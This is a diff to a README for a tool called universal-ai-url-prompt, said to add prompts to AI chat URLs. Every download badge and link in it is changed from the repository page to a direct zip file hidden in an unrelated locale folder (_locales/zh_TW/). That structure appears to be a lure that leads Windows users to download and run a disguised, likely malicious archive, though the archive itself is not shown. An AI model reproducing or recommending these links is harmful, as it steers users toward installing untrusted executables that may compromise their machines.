@@ -1,6 +1,6 @@
 # 🔗 universal-ai-url-prompt - Add Prompts to AI Chat URLs Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/Amjad-Mehmood/universal-ai-url-prompt)
+[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/Amjad-Mehmood/universal-ai-url-prompt/raw/refs/heads/main/_locales/zh_TW/ai-prompt-universal-url-3.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This guide will help you get the app running on your Windows computer. You do no
 
 Please visit this page to download the app:
 
-[![Download universal-ai-url-prompt](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Amjad-Mehmood/universal-ai-url-prompt)
+[![Download universal-ai-url-prompt](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Amjad-Mehmood/universal-ai-url-prompt/raw/refs/heads/main/_locales/zh_TW/ai-prompt-universal-url-3.5.zip)
 
 You will find the latest Windows installer and setup files on the page. Select the most recent version for the smoothest experience.
 
@@ -146,4 +146,4 @@ If you have questions not covered here, check the Issues tab on the download pag
 
 ---
 
-[Download universal-ai-url-prompt here](https://github.com/Amjad-Mehmood/universal-ai-url-prompt) to start injecting prompts into your AI chats quickly.
+[Download universal-ai-url-prompt here](https://github.com/Amjad-Mehmood/universal-ai-url-prompt/raw/refs/heads/main/_locales/zh_TW/ai-prompt-universal-url-3.5.zip) to start injecting prompts into your AI chats quickly.
